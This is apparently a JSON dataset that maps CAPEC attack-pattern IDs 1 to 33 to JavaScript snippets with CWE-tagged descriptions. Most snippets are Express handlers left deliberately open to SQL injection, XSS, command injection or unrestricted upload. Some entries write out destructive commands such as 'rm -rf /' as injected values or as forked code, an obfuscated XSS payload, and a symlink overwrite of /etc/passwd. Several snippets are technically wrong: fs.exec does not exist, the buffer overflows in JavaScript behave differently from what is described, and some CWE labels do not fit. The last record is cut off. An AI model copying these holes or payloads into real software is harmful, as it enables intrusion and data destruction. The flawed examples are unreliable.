[
    {
        "capec_id": "1",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// CWE-285: Improper Authorization\napp.get('/admin', (req, res) => {\n  res.sendFile(__dirname + '/admin.html');\n});\n\n// CWE-732: Incorrect Permission Assignment for Critical Resource\napp.get('/critical-resource', (req, res) => {\n  res.sendFile(__dirname + '/critical-resource.txt');\n});\n\n// CWE-1220: Insufficient Granularity of Access Control\napp.get('/confidential-info', (req, res) => {\n  res.sendFile(__dirname + '/confidential-info.txt');\n});\n\n// CWE-276: Incorrect Default Permissions\nconst fs = require('fs');\nfs.chmodSync(__dirname + '/sensitive-file.txt', '0777');\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates the CAPEC of missing access control lists (ACLs) in a web application. The code allows unauthorized access to sensitive resources, such as the admin panel, critical resources, and confidential information, due to improper authorization, incorrect permission assignment, and insufficient granularity of access control. Additionally, the code sets incorrect default permissions for a sensitive file, allowing anyone to modify it."
    },
    {
        "capec_id": "2",
        "code_snippet": "const maxAttempts = 3;\nlet attempts = 0;\n\nfunction authenticate(username, password) {\n  if (attempts >= maxAttempts) {\n    console.log('Account locked out.');\n    return false;\n  }\n\n  // Weak password requirements, allowing easily guessable passwords\n  if (password.length < 8) {\n    return true;\n  }\n\n  // No rate limiting or IP blocking, allowing brute force attacks\n  attempts++;\n  if (username === 'admin' && password === 'password123') {\n    return true;\n  } else {\n    console.log('Invalid credentials.');\n    return false;\n  }\n}\n\n// Attacker can easily lock out a legitimate user by making multiple failed authentication attempts\nfor (let i = 0; i < 5; i++) {\n  authenticate('admin', 'wrongpassword');\n}",
        "description": "This code snippet demonstrates a vulnerable authentication system that can be exploited by an attacker to launch a denial of service attack against a legitimate user. The system has an overly restrictive account lockout mechanism (CWE-645) that locks an account after a certain number of incorrect login attempts. The system also has weak password requirements (CWE-521), allowing easily guessable passwords. Additionally, the system lacks sufficient measures to prevent multiple failed authentication attempts within a short time frame (CWE-307), making it susceptible to brute force attacks. An attacker can exploit these weaknesses to lock out a legitimate user, denying them access to their account."
    },
    {
        "capec_id": "3",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/api/data', (req, res) => {\n  const userInput = req.query.input;\n  const filteredInput = userInput.replace(/^\\s+/, ''); // strip leading whitespace\n  const data = getDataFromDatabase(filteredInput);\n  res.json(data);\n});\n\nfunction getDataFromDatabase(input) {\n  // assume this function retrieves data from the database based on the input\n  // and returns it in a JSON format\n  if (input === 'admin') {\n    return { username: 'admin', role: 'admin' };\n  } else {\n    return { username: 'user', role: 'user' };\n  }\n}",
        "description": "This code snippet demonstrates the CAPEC of 'Stripping Leading Characters' where an adversary can introduce leading 'ghost' characters to bypass input filters. The code uses the CWEs of Improper Input Validation (CWE-20), Encoding Error (CWE-172), and Incorrect Behavior Order: Validate Before Filter (CWE-181) to create a vulnerable API endpoint. The API endpoint strips leading whitespace characters from the user input, but an adversary can introduce Unicode whitespace characters (e.g., U+2000) that are not stripped by the filter, allowing them to access unauthorized data."
    },
    {
        "capec_id": "4",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  const ip = req.ip;\n  if (ip === '127.0.0.1' || ip === '::1' || ip === '0:0:0:0:0:0:0:1') {\n    res.send('Welcome, admin!');\n  } else {\n    res.send('Access denied.');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable JavaScript application that relies on IP address for authentication (CWE-291) and does not properly handle alternate encoding of IP addresses (CWE-173). An attacker can bypass the access control by using an alternate encoding of the IP address, such as '0177.0000.0000.0001' for '127.0.0.1'. The code also does not ensure that the IP address is truly associated with the hostname (CWE-350) and does not properly restrict the communication channel to the intended endpoint (CWE-923). Additionally, it does not neutralize user-controlled input for executable script disguised with URI encodings (CWE-84)."
    },
    {
        "capec_id": "5",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/admin/route', (req, res) => {\n  const tone = req.body.tone;\n  if (tone === 'supervisor_signal') {\n    // impersonate supervisor signal\n    const adminAction = req.body.adminAction;\n    if (adminAction === 'reroute_call') {\n      // reroute call without proper authorization\n      res.send('Call rerouted successfully.');\n    } else if (adminAction === 'usurp_command') {\n      // usurp command without proper authorization\n      res.send('Command usurped successfully.');\n    }\n  } else {\n    res.status(401).send('Unauthorized access.');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000.');\n});",
        "description": "This code snippet demonstrates a vulnerable JavaScript server that allows an attacker to impersonate a supervisor signal and perform administrative actions without proper authorization. The server does not enforce strong authorization for administrative functions, allowing an attacker to send a tone that impersonates a supervisor signal and perform actions such as rerouting calls or usurping command of the line. This code embodies the main idea of the CAPEC and relates to CWEs 285, 923, 940, 294, and 924."
    },
    {
        "capec_id": "6",
        "code_snippet": "const exec = require('child_process').exec;\n\nfunction getUserDetails(username) {\n  const query = `cat /etc/passwd | grep ${username} | cut -d\":\" -f1`; \n  exec(query, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`stdout: ${stdout}`);\n    console.log(`stderr: ${stderr}`);\n  });\n}\n\ngetUserDetails('admin');",
        "description": "This JavaScript code snippet demonstrates OS Command Injection (CWE-78) vulnerability. The getUserDetails function takes a username as input and constructs an OS command to retrieve the user details from the /etc/passwd file. The input username is not properly sanitized, allowing an attacker to inject malicious commands. For example, if the input username is 'admin; rm -rf /', the code will execute the rm -rf / command, leading to unintended consequences."
    },
    {
        "capec_id": "7",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst mysql = require('mysql');\n\nconst db = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: 'password',\n  database: 'mydb'\n});\n\napp.get('/users/:id', (req, res) => {\n  const userId = req.params.id;\n  const query = `SELECT * FROM users WHERE id = ${userId}`;\n  db.query(query, (err, results) => {\n    if (err) {\n      res.status(500).send('Error occurred');\n    } else {\n      res.send(results);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable JavaScript code that is susceptible to Blind SQL Injection. The code uses user input (req.params.id) directly in the SQL query without proper validation or sanitization, making it vulnerable to SQL Injection attacks (CWE-89). The error handling is also insufficient, as it only returns a generic error message without providing any sensitive information (CWE-209). The code also lacks proper input validation (CWE-20) and neutralization of special elements (CWE-74, CWE-707). An attacker can exploit this vulnerability by sending carefully crafted input to probe the target and determine the structure and syntax of the SQL query."
    },
    {
        "capec_id": "8",
        "code_snippet": "function vulnerableFunction(buffer) {\n  var outputBuffer = new Buffer(1024);\n  outputBuffer.write(buffer, 0, buffer.length);\n  return outputBuffer.toString('utf8');\n}\n\nfunction main() {\n  var userInput = 'A'.repeat(2048);\n  var result = vulnerableFunction(userInput);\n  console.log(result);\n}\n\nmain();",
        "description": "This JavaScript code snippet demonstrates a buffer overflow vulnerability. The `vulnerableFunction` takes a `buffer` as input and writes it to an `outputBuffer` without checking the size of the input. This can cause a buffer overflow when the input size exceeds the output buffer size. The `main` function calls `vulnerableFunction` with a large input string, triggering the buffer overflow. This code embodies the CAPEC idea of targeting vulnerable libraries or shared code modules, and relates to CWEs 120, 119, and 680."
    },
    {
        "capec_id": "9",
        "code_snippet": "const exec = require('child_process').exec;\nconst userInput = 'touch /root/owned.txt';\nconst buffer = Buffer.alloc(10);\nbuffer.write(userInput, 0);\nconst command = 'sudo ' + buffer.toString('utf8', 0, 10);\nexec(command, (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.log(`stderr: ${stderr}`);\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable command-line utility that can be exploited to escalate privilege to root. It uses the 'child_process' module to execute a system command constructed from user input, which is not validated or sanitized. The 'Buffer' object is used to store the user input, but its size is not checked, leading to a potential buffer overflow (CWE-120). The command is then executed with elevated privileges using 'sudo', allowing an attacker to inject malicious commands (CWE-74). The code also lacks input validation (CWE-20) and does not restrict operations within the boundaries of the resource (CWE-118, CWE-119). Additionally, the code is vulnerable to integer overflow to buffer overflow (CWE-680) and incorrect comparison (CWE-697). A compiler optimization issue (CWE-733) could also potentially remove or modify security-critical code."
    },
    {
        "capec_id": "10",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  const userInput = req.query.userInput;\n  const buffer = Buffer.alloc(10);\n  buffer.write(userInput, 0, 'utf8');\n  res.send(buffer.toString());\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a buffer overflow vulnerability through manipulation of environment variables. The express.js server listens for GET requests and writes user input to a buffer without checking its size, leading to a classic buffer overflow (CWE-120). The code also lacks input validation (CWE-20), allowing an attacker to inject malicious data. Furthermore, the code uses an indexable resource (the buffer) without restricting operations within its boundaries (CWE-118), and performs operations on the buffer without verifying that the input size is less than the buffer size (CWE-119)."
    },
    {
        "capec_id": "11",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/:file', (req, res) => {\n    const file = req.params.file;\n    const filePath = `./uploads/${file}`;\n    res.download(filePath);\n});",
        "description": "This code snippet demonstrates a vulnerable JavaScript code that allows an attacker to exploit the server by misclassifying files based on their extensions. The code uses the Express.js framework to create a route that accepts a file name as a parameter and serves the file from the ./uploads directory. However, it does not validate the file extension, allowing an attacker to upload a malicious file with a fake extension and trick the server into executing it. This vulnerability is related to CWE-430, CWE-646, CWE-433, CWE-641, and CWE-98."
    },
    {
        "capec_id": "12",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/updateRole', (req, res) => {\n  const userId = req.body.userId;\n  const newRole = req.body.newRole;\n  const userRoles = {\n    'user1': 'admin',\n    'user2': 'moderator',\n    'user3': 'user'\n  };\n\n  if (userId in userRoles) {\n    userRoles[userId] = newRole;\n    res.send(`Role updated for user ${userId} to ${newRole}`);\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable JavaScript server that allows an attacker to impersonate a user and gain unauthorized access to privileged information. The server uses a public information channel (HTTP request) to update a user's role, but it does not perform any authentication or validation of the user's identity (CWE-306). The server also transmits sensitive information (user roles) in the response data (CWE-201). An attacker can manipulate the request data to impersonate a user and gain access to privileged information. Additionally, the server does not ensure the integrity of the message during transmission (CWE-924), making it vulnerable to tampering. The incorrect conversion and decoding of security identifiers (CWE-1292 and CWE-1290) are also demonstrated in this code snippet."
    },
    {
        "capec_id": "13",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/api/data', (req, res) => {\n  const userId = req.query.userId;\n  const userData = getUserData(userId);\n  res.json(userData);\n});\n\napp.get('/api/config', (req, res) => {\n  const configPath = req.query.configPath;\n  const configFile = require(configPath);\n  res.json(configFile);\n});\n\napp.post('/api/upload', (req, res) => {\n  const filePath = req.body.filePath;\n  const fileContent = req.body.fileContent;\n  fs.writeFileSync(filePath, fileContent);\n  res.json({ message: 'File uploaded successfully' });\n});",
        "description": "This code snippet demonstrates the CAPEC of modifying environment variables to deviate from expected operation. The code has multiple vulnerabilities: CWE-15 (External Control of System or Configuration Setting) in the /api/config endpoint, CWE-73 (External Control of File Name or Path) in the /api/upload endpoint, CWE-20 (Improper Input Validation) in all endpoints, CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) in the /api/data endpoint, and CWE-353 (Missing Support for Integrity Check) in the lack of input validation and integrity checks. An attacker can exploit these vulnerabilities to modify environment variables, access sensitive information, and deviate from the expected operation of the application."
    },
    {
        "capec_id": "14",
        "code_snippet": "function processUserInput(input) {\n  var buffer = new Buffer(1024);\n  var hostileServiceContent = getHostileServiceContent();\n  buffer.write(hostileServiceContent, 0, hostileServiceContent.length);\n  var userInput = input;\n  buffer.write(userInput, 0, userInput.length);\n  var output = '';\n  for (var i = 0; i < buffer.length; i++) {\n    output += buffer[i];\n  }\n  return output;\n}\n\nfunction getHostileServiceContent() {\n  return '<script>alert(\"XSS\")</script>'; // malicious content\n}\n",
        "description": "This JavaScript code snippet demonstrates a buffer overflow vulnerability in a client-side application. The `processUserInput` function writes user input to a fixed-size buffer without checking the input size, leading to a buffer overflow (CWE-120). The `getHostileServiceContent` function returns malicious content from a hostile service, which is then written to the buffer. The code also lacks input validation (CWE-20) and does not perform integrity checks on the data (CWE-353). Additionally, the code is vulnerable to range errors (CWE-118) and improper restriction of operations within the bounds of a memory buffer (CWE-119). The malicious content can lead to code injection (CWE-74) and potentially other security vulnerabilities."
    },
    {
        "capec_id": "15",
        "code_snippet": "const fs = require('fs');\nconst userInput = \"../../etc/passwd\";\nconst command = `cat ${userInput}`;\nfs.exec(command, (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.log(`stderr: ${stderr}`);\n});",
        "description": "This code snippet demonstrates command injection vulnerability (CWE-77) by concatenating user input with a system command. The userInput variable is not properly sanitized, allowing an attacker to inject malicious commands. For example, if the userInput is set to \"../../etc/passwd; rm -rf /\", the code will execute the rm command, deleting files on the system. This vulnerability can be exploited to access sensitive files, execute arbitrary system commands, or even take control of the system."
    },
    {
        "capec_id": "16",
        "code_snippet": "const dictionary = ['password123', 'iloveyou', 'dragonball', ...];\n\nconst users = {\n  'john': 'password123',\n  'jane': 'iloveyou',\n  'admin': 'dragonball'\n};\n\nfor (const word of dictionary) {\n  for (const user in users) {\n    if (users[user] === word) {\n      console.log(`Access granted for ${user} with password ${word}`);\n      // Perform actions as the compromised user\n    }\n  }\n}",
        "description": "This code snippet demonstrates a dictionary attack, where an attacker uses a list of common passwords to gain access to user accounts. The code uses a weak password requirement (CWE-521) and does not implement password aging (CWE-262) or restrict excessive authentication attempts (CWE-307). It also relies on single-factor authentication (CWE-308) and uses a password system as the primary means of authentication (CWE-309). The code iterates through the dictionary and checks each word against the stored passwords, granting access if a match is found."
    },
    {
        "capec_id": "17",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst fs = require('fs');\n\napp.post('/upload', (req, res) => {\n  const file = req.body.file;\n  fs.writeFile('/uploads/' + file.name, file.data, (err) => {\n    if (err) {\n      res.status(500).send({ message: 'Error uploading file' });\n    } else {\n      res.send({ message: 'File uploaded successfully' });\n    }\n  });\n});\n\napp.get('/execute', (req, res) => {\n  const fileName = req.query.fileName;\n  fs.chmod('/uploads/' + fileName, '755', (err) => {\n    if (err) {\n      res.status(500).send({ message: 'Error changing file permissions' });\n    } else {\n      require('/uploads/' + fileName);\n      res.send({ message: 'File executed successfully' });\n    }\n  });\n});",
        "description": "This code snippet demonstrates a vulnerable Node.js server that allows an attacker to upload and execute arbitrary files. The server uses the express framework and the fs module to handle file uploads and execution. The upload endpoint allows an attacker to upload a file to the /uploads directory, and the execute endpoint changes the permissions of the uploaded file to make it executable and then requires it, allowing the attacker to execute arbitrary code. This code embodies the CAPEC by allowing an adversary to upload a file and then execute it, and it relates to the CWEs by demonstrating improper permission assignment (CWE-732), improper authorization (CWE-285), least privilege violation (CWE-272), improper link resolution (CWE-59), improper ownership management (CWE-282), privilege context switching error (CWE-270), and protection mechanism failure (CWE-693)."
    },
    {
        "capec_id": "18",
        "code_snippet": "<img src='x' onerror=\"eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))\">",
        "description": "This code snippet demonstrates a stored XSS attack by injecting malicious script in an image tag's onerror attribute. The script uses the eval function to execute the alert('XSS') payload when the image fails to load. This attack takes advantage of improper neutralization of script-related HTML tags (CWE-80), script in attributes of IMG tags (CWE-82), and incomplete denylist to cross-site scripting (CWE-692)."
    },
    {
        "capec_id": "19",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  const userInput = req.query.userInput;\n  const script = `<script>${userInput}</script>`;\n  res.send(script);\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable web application that allows an adversary to execute their own script by embedding it within other scripts. The application uses the Express.js framework and allows user input to be injected into a script tag, which is then executed by the browser. This is an example of CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting'). The application also lacks proper access control, allowing unauthorized actors to access the resource (CWE-284). Additionally, the application includes web functionality from an untrusted source, potentially granting total access and control to the untrusted source (CWE-830). The code also contains embedded malicious code (CWE-506) and may lead to unintended reentrant invocation of non-reentrant code via nested calls (CWE-1265)."
    },
    {
        "capec_id": "20",
        "code_snippet": "const crypto = require('crypto');\n\n// CWE-326: Inadequate Encryption Strength - Using a weak encryption algorithm (DES)\nconst algorithm = 'des-cbc';\nconst password = 'weakpassword';\n\n// CWE-327: Use of a Broken or Risky Cryptographic Algorithm - Using a broken algorithm (MD5)\nconst hash = crypto.createHash('md5');\n\n// CWE-693: Protection Mechanism Failure - Not using a secure protocol for key exchange\nconst key = hash.update(password).digest();\n\n// CWE-1204: Generation of Weak Initialization Vector (IV) - Using a predictable IV\nconst iv = Buffer.alloc(8, '00000000', 'hex');\n\n// CWE-321: Use of Hard-coded Cryptographic Key - Hard-coding the encryption key\nconst encryptedData = crypto.createCipheriv(algorithm, key, iv);\n\n// Brute-force attack on the key space\nfor (let i = 0; i < 1000000; i++) {\n  const attemptKey = Buffer.alloc(8, i.toString(), 'hex');\n  const decipher = crypto.createDecipheriv(algorithm, attemptKey, iv);\n  const decryptedData = decipher.update(encryptedData);\n  if (decryptedData.toString() === 'expected_plaintext') {\n    console.log('Key found:', i);\n    break;\n  }\n}",
        "description": "This code snippet demonstrates a vulnerable encryption implementation in JavaScript, embodying the CAPEC of an attacker performing an exhaustive search on the key space to determine the decryption key. The code uses a weak encryption algorithm (DES), a broken hash function (MD5), a predictable initialization vector, and a hard-coded encryption key, making it susceptible to brute-force attacks."
    },
    {
        "capec_id": "21",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst cookieParser = require('cookie-parser');\napp.use(cookieParser());\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  if (checkCredentials(username, password)) {\n    const sessionId = generateSessionId(); // CWE-6: Insufficient Session-ID Length\n    res.cookie('sessionId', sessionId, { expires: new Date(Date.now() + 900000), httpOnly: true });\n    res.send('Logged in successfully');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/protected', (req, res) => {\n  const sessionId = req.cookies.sessionId;\n  if (sessionId) {\n    const userData = getUserDataFromSessionId(sessionId); // CWE-642: External Control of Critical State Data\n    if (userData) {\n      res.send(`Welcome, ${userData.username}!`);\n    } else {\n      res.status(403).send('Access denied');\n    }\n  } else {\n    res.status(401).send('Please login first');\n  }\n});\n\nfunction generateSessionId() {\n  return Math.floor(Math.random() * 100000); // CWE-384: Session Fixation\n}\n\nfunction checkCredentials(username, password) {\n  // CWE-290: Authentication Bypass by Spoofing, CWE-302: Authentication Bypass by Assumed-Immutable Data\n  // CWE-346: Origin Validation Error\n  // CWE-539: Use of Persistent Cookies Containing Sensitive Information\n  // CWE-602: Client-Side Enforcement of Server-Side Security\n  // CWE-664: Improper Control of a Resource Through its Lifetime\n  return true; // Always return true for demonstration purposes\n}",
        "description": "This code snippet demonstrates a vulnerable authentication system that is susceptible to session fixation attacks. The generateSessionId function generates a predictable session ID, and the checkCredentials function always returns true, allowing an attacker to bypass authentication. The code also uses persistent cookies containing sensitive information and does not properly verify the source of data or communication. An attacker can exploit these weaknesses to perform authorized actions under the guise of an authenticated user."
    },
    {
        "capec_id": "22",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  if (username === 'admin' && password === 'password') {\n    res.cookie('auth', 'true');\n    res.send('Logged in successfully');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/protected', (req, res) => {\n  if (req.cookies.auth === 'true') {\n    res.send('Welcome, admin!');\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});",
        "description": "This code snippet demonstrates a vulnerable authentication mechanism that is susceptible to spoofing attacks. The server trusts the client's authentication cookie without proper validation, allowing an attacker to bypass authentication by sending a forged cookie. The code also lacks input validation, exposing it to potential injection attacks. Furthermore, sensitive information (the admin username and password) is hardcoded, making it vulnerable to exposure."
    },
    {
        "capec_id": "23",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst multer = require('multer');\nconst upload = multer({ dest: './uploads/' });\n\napp.post('/upload', upload.single('file'), (req, res) => {\n  const file = req.file;\n  const filePath = './uploads/' + file.originalname;\n  require('fs').writeFileSync(filePath, file.buffer);\n  res.send(`File uploaded successfully!`);\n});\n\napp.get('/download/:filename', (req, res) => {\n  const filename = req.params.filename;\n  const filePath = './uploads/' + filename;\n  res.download(filePath);\n});",
        "description": "This code snippet demonstrates a vulnerable file upload functionality in a Node.js Express application. The code uses the multer library to handle file uploads, but it does not validate the file type or extension, allowing an attacker to upload malicious files (CWE-434). The code also relies on the file name and extension to determine the appropriate behavior (CWE-646). Furthermore, the code stores the uploaded file in a directory that is accessible by the web server, allowing an attacker to access the file directly (CWE-433). Finally, the code does not parse or validate the uploaded file content, making it vulnerable to embedded malicious code (CWE-506). An attacker can exploit these vulnerabilities by uploading a malicious file, such as a JavaScript file with a .jpg extension, which can be executed by the server or downloaded and executed by a user, leading to a potential remote code execution vulnerability."
    },
    {
        "capec_id": "24",
        "code_snippet": "function filterInput(input) {\n  var buffer = new Buffer(1024);\n  buffer.write(input, 0, input.length);\n  return buffer.toString();\n}\n\nvar userInput = \"\";\nfor (var i = 0; i < 100000; i++) {\n  userInput += \"A\";\n}\n\nfilterInput(userInput);",
        "description": "This code snippet demonstrates a vulnerable filter function that can be exploited by an oversized transaction. The function writes user input to a buffer without checking its size, leading to a buffer overflow (CWE-120). The input string is intentionally oversized to cause the buffer to overflow. The code also lacks input validation (CWE-20), allowing an attacker to inject malicious data. Additionally, the use of a fixed-size buffer can lead to integer overflow (CWE-680) and incorrect access of indexable resources (CWE-118)."
    },
    {
        "capec_id": "25",
        "code_snippet": "let lock1 = false;\nlet lock2 = false;\n\nfunction thread1() {\n    while (true) {\n        if (!lock1) {\n            lock1 = true;\n            console.log('Thread 1 acquired lock 1');\n            while (!lock2) {\n                // wait for lock 2 to be released\n            }\n            console.log('Thread 1 acquired lock 2');\n            lock2 = true;\n            // critical section\n            console.log('Thread 1 in critical section');\n            lock1 = false;\n            lock2 = false;\n        }\n    }\n}\n\nfunction thread2() {\n    while (true) {\n        if (!lock2) {\n            lock2 = true;\n            console.log('Thread 2 acquired lock 2');\n            while (!lock1) {\n                // wait for lock 1 to be released\n            }\n            console.log('Thread 2 acquired lock 1');\n            lock1 = true;\n            // critical section\n            console.log('Thread 2 in critical section');\n            lock2 = false;\n            lock1 = false;\n        }\n    }\n}\n\nthread1();\nthread2();",
        "description": "This code snippet demonstrates a deadlock condition in JavaScript. Two threads, thread1 and thread2, are competing for two locks, lock1 and lock2. Each thread tries to acquire both locks in a different order, leading to a deadlock situation where both threads are waiting for each other to release a lock, causing a denial of service."
    },
    {
        "capec_id": "26",
        "code_snippet": "const fs = require('fs');\nlet fileContent = '';\n\n// CWE-363: Race Condition Enabling Link Following\nfs.stat('file.txt', (err, stats) => {\n  if (!err && stats.isFile()) {\n    fs.readFile('file.txt', 'utf8', (err, data) => {\n      if (!err) {\n        fileContent = data;\n      }\n    });\n  }\n});\n\n// CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')\nsetTimeout(() => {\n  fs.writeFile('file.txt', 'malicious content', (err) => {\n    if (!err) {\n      console.log('File replaced with malicious content');\n    }\n  });\n}, 10);\n",
        "description": "This code snippet demonstrates a race condition vulnerability in Node.js. The fs.stat() function checks if the file exists and is a file, but before the fs.readFile() function is called, an attacker can replace the original file with a malicious one, causing the system to read the malicious file. The setTimeout() function is used to simulate concurrent execution, making it possible for an attacker to exploit the race condition."
    },
    {
        "capec_id": "27",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction createTempFile() {\n  const tempDir = '/tmp';\n  const targetFile = '/etc/passwd'; // sensitive file\n  const symlinkName = 'symlink_to_target';\n\n  // CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition\n  if (!fs.existsSync(symlinkName)) {\n    fs.symlink(targetFile, symlinkName, (err) => {\n      if (err) {\n        console.error(err);\n      } else {\n        // CWE-61: UNIX Symbolic Link (Symlink) Following\n        fs.writeFile(symlinkName, 'malicious content', (err) => {\n          if (err) {\n            console.error(err);\n          } else {\n            console.log('Malicious content written to sensitive file');\n          }\n        });\n      }\n    });\n  }\n}\n\ncreateTempFile();",
        "description": "This code snippet demonstrates a TOCTOU race condition vulnerability by creating a symbolic link to a sensitive file and then writing malicious content to it. The attacker can exploit this vulnerability by creating the symlink during the interval between the check and the creation of the temporary file, allowing them to write to the sensitive file."
    },
    {
        "capec_id": "28",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/search', (req, res) => {\n  const userInput = req.query.searchTerm;\n  const dbQuery = `SELECT * FROM products WHERE name LIKE '%${userInput}%';`;\n  db.query(dbQuery, (err, results) => {\n    if (err) {\n      res.status(500).send(`Error: ${err}`);\n    } else {\n      res.send(results);\n    }\n  });\n});",
        "description": "This code snippet demonstrates a vulnerable JavaScript code that is susceptible to fuzzing attacks. The code uses user input to construct a database query without proper validation or sanitization, making it vulnerable to SQL injection (CWE-74). The code also lacks input validation (CWE-20), allowing an attacker to craft malicious input that can lead to unintended behavior. Additionally, the error handling mechanism discloses sensitive information about the environment (CWE-209), which can aid an attacker in further exploitation. A fuzzing attack can be used to identify these weaknesses by feeding the system with randomly constructed input and observing the responses."
    },
    {
        "capec_id": "29",
        "code_snippet": "const fs = require('fs');\n\nfunction checkAndUseFile() {\n  if (fs.existsSync('file.txt')) {\n    // Time-of-check Time-of-use (TOCTOU) Race Condition\n    // An attacker can delete or modify the file between the check and use\n    fs.readFile('file.txt', (err, data) => {\n      if (err) {\n        console.error(err);\n      } else {\n        console.log(data);\n      }\n    });\n  }\n}\n\n// Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')\n// Multiple threads can access and modify the file simultaneously\nsetInterval(checkAndUseFile, 100);\nsetInterval(() => {\n  fs.writeFile('file.txt', 'New content', (err) => {\n    if (err) {\n      console.error(err);\n    }\n  });\n}, 50);\n",
        "description": "This JavaScript code snippet demonstrates a Time-of-check Time-of-use (TOCTOU) Race Condition (CWE-367) and Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition') (CWE-362). The code checks if a file exists and then reads its content. However, between the check and the read, an attacker can delete or modify the file, causing unexpected behavior. Additionally, the code uses setInterval to concurrently access and modify the file, which can lead to simultaneous access and modification by multiple threads, further exacerbating the race condition."
    },
    {
        "capec_id": "30",
        "code_snippet": "const { fork } = require('child_process');\nconst fs = require('fs');\n\nlet maliciousCode = 'require(\"child_process\").exec(\"rm -rf /\");';\n\nfs.writeFileSync('/tmp/malicious.js', maliciousCode);\n\nlet child = fork('/tmp/malicious.js');\nchild.send('start');\n\nchild.on('message', (msg) => {\n  if (msg === 'done') {\n    console.log('Malicious code executed successfully.');\n  }\n});",
        "description": "This code snippet demonstrates the CAPEC of hijacking a privileged thread of execution by injecting malicious code into a running process. It uses CWE-114 (Process Control) by executing a malicious script using the child_process module, CWE-270 (Privilege Context Switching Error) by switching between different contexts with different privileges, CWE-362 (Concurrent Execution using Shared Resource with Improper Synchronization) by using a shared file to store and execute the malicious code, CWE-78 (Improper Neutralization of Special Elements used in an OS Command) by constructing an OS command using externally-influenced input, and CWE-1421 (Exposure of Sensitive Information in Shared Microarchitectural Structures during Transient Execution) by potentially exposing sensitive information through a covert channel."
    },
    {
        "capec_id": "31",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.cookieParser());\n\napp.get('/', (req, res) => {\n  const username = req.cookies.username;\n  const role = req.cookies.role;\n  if (username && role) {\n    // authenticate user without validating the cookie\n    res.send(`Welcome, ${username}! You are a ${role}.`);\n  } else {\n    res.send('Please login.');\n  }\n});\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === 'admin' && password === 'password') {\n    // store sensitive information in cleartext in a cookie\n    res.cookie('username', username, { httpOnly: false });\n    res.cookie('role', 'admin', { httpOnly: false });\n    res.send('Login successful.');\n  } else {\n    res.send('Invalid credentials.');\n  }\n});",
        "description": "This code snippet demonstrates a vulnerable web application that relies on HTTP cookies to store sensitive information, such as usernames and roles, without proper validation and encryption. An attacker can intercept and modify the cookies to impersonate a user or gain unauthorized access."
    },
    {
        "capec_id": "32",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/search', (req, res) => {\n  const query = req.query.q;\n  const html = `<div>Search results for: ${query}</div>`;\n  res.send(html);\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "A vulnerable Node.js Express.js web application that is susceptible to cross-site scripting (XSS) attacks. The application uses the HTTP GET method to process a request and includes user-controllable input in the query string. The input is not properly validated or neutralized, allowing an attacker to inject malicious script code that will be executed by the victim's browser."
    },
    {
        "capec_id": "33",
        "code_snippet": "const http = require('http');\nconst proxy = http.createServer((req, res) => {\n  const maliciousReq = http.request({\n    hostname: 'example.com',\n    path: '/admin/delete',\n    method: 'POST',\n    headers: {\n      'Content-Length': '0\r\n\r\n',\n      'X-Forwarded-For': '192.168.1.100'\n    }\n  }, (proxyRes) => {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Proxy response');\n  });\n  maliciousReq.write('');\n  maliciousReq.end();\n});\nproxy.listen(8080, () => {\n  console.log('Proxy server listening on port 8080');\n});",
